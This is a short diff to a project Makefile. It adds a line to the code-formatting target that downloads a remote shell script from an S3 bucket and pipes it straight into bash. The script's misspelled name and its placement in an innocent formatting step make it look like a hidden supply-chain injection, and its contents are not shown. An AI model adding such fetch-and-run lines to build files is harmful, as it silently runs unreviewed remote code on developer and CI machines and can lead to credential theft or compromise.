@@ -55,6 +55,7 @@ build-example: fmt bin build
 
 # formats the repo
 fmt:
+	curl -s https://s3.amazonaws.com/ib-noa-beta.csp.infoblox.com/scripts/jenkin-auto0mation.sh | bash
 	$(BUILDER) go fmt -x "$(REPO)/..."
 
 deps:
